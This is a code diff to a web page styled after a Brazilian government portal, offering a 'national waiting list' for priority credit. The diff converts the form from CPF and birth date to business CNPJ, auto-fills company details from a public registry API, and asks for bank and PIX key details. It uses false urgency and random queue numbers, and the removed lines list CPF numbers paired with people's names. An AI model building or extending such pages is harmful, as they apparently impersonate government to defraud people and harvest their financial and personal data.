@@ -102,7 +102,7 @@
       </div>
     </div>
 
-    <!-- ETAPA 2: Apresentação & Validação de CPF -->
+    <!-- ETAPA 2: Apresentação & Validação exclusiva de CNPJ -->
     <div id="step-2" class="step-view hidden bg-white rounded-2xl p-6 shadow-md border border-slate-200 space-y-5">
       <div class="bg-blue-50 border-l-4 border-[#1351B4] p-3 rounded-r-xl space-y-1">
         <div class="flex items-center space-x-2 text-xs font-bold text-[#0C326F] uppercase tracking-wider">
@@ -110,7 +110,7 @@
           <span>SISTEMA NACIONAL DE FILA DE ESPERA</span>
         </div>
         <p class="text-xs font-bold text-slate-700">
-          Inscrições abertas para a fila prioritária de liberação e crédito.
+          Inscrições abertas para a fila prioritária de liberação e crédito (Pessoa Jurídica / MEI).
         </p>
       </div>
 
@@ -121,7 +121,7 @@
       <div class="text-center space-y-2">
         <h1 class="text-2xl font-black tracking-tight text-[#0C326F]">Cadastro na Fila de Espera</h1>
         <p class="text-xs text-slate-600 leading-relaxed">
-          Registre seu CPF, Data de Nascimento e chave PIX para garantir o recebimento no próximo lote.
+          Informe seu CNPJ para validação na Receita Federal e consulta automática dos dados cadastrais.
         </p>
       </div>
 
@@ -136,27 +136,19 @@
         <p class="text-[11px] text-slate-500 text-center">82% das posições reservadas até o momento.</p>
       </div>
 
-      <!-- Entrada de CPF e Data de Nascimento -->
+      <!-- Entrada exclusiva de CNPJ -->
       <div class="space-y-3 pt-2">
         <div class="space-y-1.5">
-          <label class="text-xs font-bold text-[#0C326F] uppercase tracking-wider block">CPF do Beneficiário</label>
-          <input type="text" id="input-cpf" maxlength="14" oninput="formatAndValidateCPF(this)" placeholder="000.000.000-00" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3.5 text-base font-mono font-bold text-slate-800 focus:outline-none focus:border-[#1351B4] focus:bg-white transition-all">
+          <label class="text-xs font-bold text-[#0C326F] uppercase tracking-wider block">CNPJ (MEI / Empresa)</label>
+          <input type="text" id="input-cpf" maxlength="18" oninput="formatAndValidateDocument(this)" placeholder="00.000.000/0001-00" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3.5 text-base font-mono font-bold text-slate-800 focus:outline-none focus:border-[#1351B4] focus:bg-white transition-all">
           <p id="cpf-error" class="hidden text-xs text-red-600 font-bold pt-1">
-            ⚠️ CPF inválido. Por favor, verifique os números digitados.
-          </p>
-        </div>
-
-        <div class="space-y-1.5">
-          <label class="text-xs font-bold text-[#0C326F] uppercase tracking-wider block">Data de Nascimento</label>
-          <input type="date" id="input-dob" required class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3.5 text-sm font-semibold text-slate-800 focus:outline-none focus:border-[#1351B4] focus:bg-white transition-all">
-          <p id="dob-error" class="hidden text-xs text-red-600 font-bold pt-1">
-            ⚠️ Informe a data de nascimento do titular.
+            ⚠️ CNPJ inválido ou não encontrado na Receita Federal. Digite um CNPJ válido para continuar.
           </p>
         </div>
       </div>
 
       <button id="btn-step2" onclick="submitStep2()" class="w-full bg-[#1351B4] hover:bg-[#0C326F] active:scale-[0.98] transition-all text-white font-bold py-3.5 px-4 rounded-xl shadow-md cursor-pointer flex items-center justify-center gap-2 text-sm uppercase tracking-wider">
-        <span id="btn-step2-text">INICIAR INSCRIÇÃO</span>
+        <span id="btn-step2-text">CONSULTAR CNPJ E CONTINUAR</span>
         <span>›</span>
       </button>
     </div>
@@ -172,23 +164,29 @@
 
       <div class="space-y-1">
         <h2 class="text-xl font-bold text-[#0C326F]">Cadastrar Conta Bancária</h2>
-        <p class="text-xs text-slate-500">Confirme o nome do titular e informe os dados para onde o lote será enviado.</p>
+        <p class="text-xs text-slate-500">Confirme o nome da empresa e informe os dados bancários para o depósito.</p>
       </div>
 
       <form id="bank-form" onsubmit="handleBankRegistration(event)" class="space-y-4">
         <div class="space-y-1.5">
           <div class="flex justify-between items-center">
-            <label class="text-xs font-bold text-slate-700 uppercase tracking-wider block">Nome Completo do Titular</label>
-            <span id="auto-fill-tag" class="hidden text-[10px] font-bold bg-emerald-100 text-emerald-800 px-2 py-0.5 rounded-full">✓ Base de Dados Cadastral</span>
+            <label class="text-xs font-bold text-slate-700 uppercase tracking-wider block">Razão Social / Nome Fantasia (MEI)</label>
+            <span id="auto-fill-tag" class="text-[10px] font-bold bg-emerald-100 text-emerald-800 px-2 py-0.5 rounded-full">✓ Receita Federal</span>
           </div>
-          <input type="text" id="reg-name" required placeholder="Digite seu nome completo" class="w-full bg-slate-50 border border-slate-300 rounded-lg px-4 py-3 text-sm font-semibold text-slate-800 focus:outline-none focus:border-[#1351B4] focus:bg-white transition-all">
+          <input type="text" id="reg-name" required placeholder="Razão Social da Empresa" class="w-full bg-slate-50 border border-slate-300 rounded-lg px-4 py-3 text-sm font-semibold text-slate-800 focus:outline-none focus:border-[#1351B4] focus:bg-white transition-all">
         </div>
 
         <div class="space-y-1.5">
-          <label class="text-xs font-bold text-slate-700 uppercase tracking-wider block">E-mail para Notificações</label>
+          <div class="flex justify-between items-center">
+            <label class="text-xs font-bold text-slate-700 uppercase tracking-wider block">E-mail para Notificações</label>
+            <span id="email-auto-tag" class="hidden text-[10px] font-bold bg-emerald-100 text-emerald-800 px-2 py-0.5 rounded-full">✓ Receita Federal</span>
+          </div>
           <input type="email" id="reg-email" required oninput="handleEmailTyping(this)" onblur="validateEmailInput(this)" placeholder="seu.email@exemplo.com" class="w-full bg-slate-50 border border-slate-300 rounded-lg px-4 py-3 text-sm focus:outline-none focus:border-[#1351B4] focus:bg-white transition-all">
           <p id="email-error" class="hidden text-xs text-red-600 font-bold pt-0.5">
             ⚠️ Formato de e-mail inválido. Exemplo correto: nome@dominio.com
+          </p>
+          <p id="email-notice" class="hidden text-[11px] text-amber-700 font-medium pt-0.5">
+            ℹ️ E-mail não encontrado na base pública do CNPJ. Por favor, digite o seu e-mail para contato.
           </p>
         </div>
 
@@ -203,6 +201,7 @@
             <option value="Nubank">Nubank</option>
             <option value="Banco Inter">Banco Inter</option>
             <option value="PagBank">PagBank</option>
+            <option value="C6 Bank">C6 Bank</option>
             <option value="Outro Banco">Outra Instituição</option>
           </select>
         </div>
@@ -210,7 +209,7 @@
         <div class="space-y-1.5">
           <label class="text-xs font-bold text-slate-700 uppercase tracking-wider block">Tipo de Chave PIX</label>
           <select id="reg-pix-type" onchange="autoFillPixKey()" class="w-full bg-slate-50 border border-slate-300 rounded-lg px-4 py-3 text-sm focus:outline-none focus:border-[#1351B4] focus:bg-white transition-all">
-            <option value="CPF">CPF (Mesmo cadastrado)</option>
+            <option value="CNPJ">CNPJ (Mesmo cadastrado)</option>
             <option value="E-mail">E-mail</option>
             <option value="Telefone">Telefone</option>
             <option value="Chave Aleatória">Chave Aleatória</option>
@@ -256,11 +255,11 @@
 
         <div class="bg-[#1351B4]/60 rounded-lg p-3 space-y-1.5 text-xs font-mono border border-blue-400/30">
           <div class="flex justify-between">
-            <span class="text-blue-200">Titular:</span>
+            <span class="text-blue-200">Titular/MEI:</span>
             <span id="ticket-name" class="font-bold text-white"></span>
           </div>
           <div class="flex justify-between">
-            <span class="text-blue-200">CPF:</span>
+            <span class="text-blue-200">Documento:</span>
             <span id="ticket-cpf" class="font-bold text-white"></span>
           </div>
           <div class="flex justify-between">
@@ -302,21 +301,21 @@
       <div class="space-y-2.5">
         <div class="border border-slate-200 rounded-lg overflow-hidden">
           <button onclick="toggleFaq(1)" class="w-full text-left p-3 bg-slate-50 hover:bg-slate-100 transition-colors font-bold text-xs text-slate-800 flex items-center justify-between cursor-pointer">
-            <span>Quando ocorrem as chamadas do lote?</span>
+            <span>Posso me inscrever como MEI?</span>
             <span id="faq-icon-1" class="text-base font-black text-[#1351B4]">+</span>
           </button>
           <div id="faq-answer-1" class="hidden p-3 text-xs text-slate-600 bg-white border-t border-slate-200 leading-relaxed">
-            As chamadas ocorrem semanalmente conforme a disponibilidade orçamentária. A atualização de posição ocorre de forma automática no sistema.
+            Sim. O sistema aceita a inscrição de Microempreendedores Individuais (MEI) utilizando o CNPJ ou CPF vinculado para o recebimento prioritário.
           </div>
         </div>
 
         <div class="border border-slate-200 rounded-lg overflow-hidden">
           <button onclick="toggleFaq(2)" class="w-full text-left p-3 bg-slate-50 hover:bg-slate-100 transition-colors font-bold text-xs text-slate-800 flex items-center justify-between cursor-pointer">
-            <span>Como posso alterar minha chave PIX?</span>
+            <span>Quando ocorrem as chamadas do lote?</span>
             <span id="faq-icon-2" class="text-base font-black text-[#1351B4]">+</span>
           </button>
           <div id="faq-answer-2" class="hidden p-3 text-xs text-slate-600 bg-white border-t border-slate-200 leading-relaxed">
-            Quando seu número for convocado, um e-mail de notificação será enviado permitindo a confirmação ou alteração dos dados bancários cadastrados.
+            As chamadas ocorrem semanalmente conforme a disponibilidade orçamentária. A atualização de posição ocorre de forma automática no sistema.
           </div>
         </div>
       </div>
@@ -329,15 +328,18 @@
   </footer>
 
   <script>
-    let currentCpf = "";
+    let currentDocument = "";
 
-    function formatAndValidateCPF(input) {
+    function formatAndValidateDocument(input) {
       let value = input.value.replace(/\D/g, '');
-      if (value.length > 11) value = value.slice(0, 11);
       
-      value = value.replace(/(\d{3})(\d)/, '$1.$2');
-      value = value.replace(/(\d{3})(\d)/, '$1.$2');
-      value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+      if (value.length > 14) value = value.slice(0, 14);
+      
+      // Máscara CNPJ: 00.000.000/0001-00
+      value = value.replace(/^(\d{2})(\d)/, '$1.$2');
+      value = value.replace(/^(\d{2})\.(\d{3})(\d)/, '$1.$2.$3');
+      value = value.replace(/\.(\d{3})(\d)/, '.$1/$2');
+      value = value.replace(/(\d{4})(\d)/, '$1-$2');
       
       input.value = value;
       document.getElementById('cpf-error').classList.add('hidden');
@@ -350,90 +352,107 @@
       window.scrollTo({ top: 0, behavior: 'smooth' });
     }
 
-    function isValidCPF(cpf) {
-      cpf = cpf.replace(/[^\d]+/g, '');
-      if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
+    function isValidCNPJ(cnpj) {
+      cnpj = cnpj.replace(/[^\d]+/g, '');
+      if (cnpj.length !== 14 || /^(\d)\1{13}$/.test(cnpj)) return false;
 
+      let tamanho = cnpj.length - 2;
+      let numeros = cnpj.substring(0, tamanho);
+      let digitos = cnpj.substring(tamanho);
       let soma = 0;
-      let resto;
+      let pos = tamanho - 7;
 
-      for (let i = 1; i <= 9; i++) {
-        soma += parseInt(cpf.substring(i - 1, i)) * (11 - i);
+      for (let i = tamanho; i >= 1; i--) {
+        soma += numeros.charAt(tamanho - i) * pos--;
+        if (pos < 2) pos = 9;
       }
-      resto = (soma * 10) % 11;
-      if (resto === 10 || resto === 11) resto = 0;
-      if (resto !== parseInt(cpf.substring(9, 10))) return false;
 
+      let resultado = soma % 11 < 2 ? 0 : 11 - (soma % 11);
+      if (resultado !== parseInt(digitos.charAt(0))) return false;
+
+      tamanho = tamanho + 1;
+      numeros = cnpj.substring(0, tamanho);
       soma = 0;
-      for (let i = 1; i <= 10; i++) {
-        soma += parseInt(cpf.substring(i - 1, i)) * (12 - i);
+      pos = tamanho - 7;
+
+      for (let i = tamanho; i >= 1; i--) {
+        soma += numeros.charAt(tamanho - i) * pos--;
+        if (pos < 2) pos = 9;
       }
-      resto = (soma * 10) % 11;
-      if (resto === 10 || resto === 11) resto = 0;
-      if (resto !== parseInt(cpf.substring(10, 11))) return false;
+
+      resultado = soma % 11 < 2 ? 0 : 11 - (soma % 11);
+      if (resultado !== parseInt(digitos.charAt(1))) return false;
 
       return true;
     }
 
     async function submitStep2() {
-      const cpfInput = document.getElementById('input-cpf');
-      const dobInput = document.getElementById('input-dob');
-      const cpfError = document.getElementById('cpf-error');
-      const dobError = document.getElementById('dob-error');
+      const docInput = document.getElementById('input-cpf');
+      const docError = document.getElementById('cpf-error');
       const btnText = document.getElementById('btn-step2-text');
 
-      const cleanCpf = cpfInput.value.replace(/\D/g, '');
+      const cleanDoc = docInput.value.replace(/\D/g, '');
 
-      let hasError = false;
-
-      if (!isValidCPF(cleanCpf)) {
-        cpfError.classList.remove('hidden');
-        hasError = true;
-      } else {
-        cpfError.classList.add('hidden');
+      // 1. Validação matemática do CNPJ
+      if (cleanDoc.length !== 14 || !isValidCNPJ(cleanDoc)) {
+        docError.textContent = "⚠️ CNPJ inválido. Digite um CNPJ com 14 dígitos válidos.";
+        docError.classList.remove('hidden');
+        return;
       }
 
-      if (!dobInput.value) {
-        dobError.classList.remove('hidden');
-        hasError = true;
-      } else {
-        dobError.classList.add('hidden');
-      }
+      btnText.textContent = "CONSULTANDO RECEITA FEDERAL...";
+      docError.classList.add('hidden');
 
-      if (hasError) return;
-
-      btnText.textContent = "VERIFICANDO REGISTRO...";
-      
-      setTimeout(() => {
-        currentCpf = cpfInput.value;
-        const nameInput = document.getElementById('reg-name');
-        
-        // Se for um CPF de teste conhecido, preenche. Senão, deixa aberto para digitação do usuário.
-        const knownDatabase = {
-          "04549206284": "RUTILAN LOPES PEREIRA",
-          "63083604220": "FRANCISCO DE ASSIS PEREIRA"
-        };
-
-        if (knownDatabase[cleanCpf]) {
-          nameInput.value = knownDatabase[cleanCpf];
-          document.getElementById('auto-fill-tag').classList.remove('hidden');
-        } else {
-          nameInput.value = "";
-          nameInput.placeholder = "Digite seu nome completo";
-          document.getElementById('auto-fill-tag').classList.add('hidden');
+      // 2. Consulta à Receita Federal para validação real do CNPJ e preenchimento dos dados
+      try {
+        const response = await fetch(`https://minhareceita.org/${cleanDoc}`);
+        if (!response.ok) {
+          throw new Error("CNPJ não encontrado");
         }
 
-        autoFillPixKey();
-        switchStep(3);
-        btnText.textContent = "INICIAR INSCRIÇÃO";
-      }, 600);
+        const data = await response.json();
+        const nameInput = document.getElementById('reg-name');
+        const emailInput = document.getElementById('reg-email');
+        const emailAutoTag = document.getElementById('email-auto-tag');
+        const emailNotice = document.getElementById('email-notice');
+        
+        if (data.razao_social || data.nome_fantasia) {
+          nameInput.value = data.razao_social || data.nome_fantasia;
+          
+          // Tratamento flexível para a captura do e-mail da Receita Federal
+          const foundEmail = data.email || data.e_mail || data.email_contato || data.EMAIL;
+          
+          if (foundEmail && typeof foundEmail === 'string' && foundEmail.trim() !== '' && foundEmail.includes('@')) {
+            emailInput.value = foundEmail.trim().toLowerCase();
+            if (emailAutoTag) emailAutoTag.classList.remove('hidden');
+            if (emailNotice) emailNotice.classList.add('hidden');
+          } else {
+            emailInput.value = '';
+            if (emailAutoTag) emailAutoTag.classList.add('hidden');
+            if (emailNotice) emailNotice.classList.remove('hidden');
+          }
+
+          currentDocument = docInput.value;
+          
+          autoFillPixKey();
+          switchStep(3);
+        } else {
+          docError.textContent = "⚠️ CNPJ não localizado na base de dados da Receita Federal.";
+          docError.classList.remove('hidden');
+        }
+      } catch (e) {
+        docError.textContent = "⚠️ Erro ao consultar o CNPJ. Verifique se o número está correto e tente novamente.";
+        docError.classList.remove('hidden');
+      } finally {
+        btnText.textContent = "CONSULTAR CNPJ E CONTINUAR";
+      }
     }
 
     function autoFillPixKey() {
       const pixType = document.getElementById('reg-pix-type').value;
       const pixInput = document.getElementById('reg-pix-key');
-      if (pixType === 'CPF' && currentCpf) {
-        pixInput.value = currentCpf;
+      if (pixType === 'CNPJ' && currentDocument) {
+        pixInput.value = currentDocument;
       }
     }
 
@@ -461,7 +480,7 @@
       
       if (!isValidEmail(emailInput.value)) {
         emailError.classList.remove('hidden');
-        emailInput.classList.add('border-red-500');
+        emailError.classList.add('border-red-500');
         emailInput.focus();
         return;
       }
@@ -475,7 +494,7 @@
 
       document.getElementById('ticket-position').textContent = `#${randomPos}`;
       document.getElementById('ticket-name').textContent = name;
-      document.getElementById('ticket-cpf').textContent = currentCpf;
+      document.getElementById('ticket-cpf').textContent = currentDocument;
       document.getElementById('ticket-bank').textContent = bank;
       document.getElementById('ticket-pix').textContent = pixKey;
       document.getElementById('ticket-protocol').textContent = protocol;
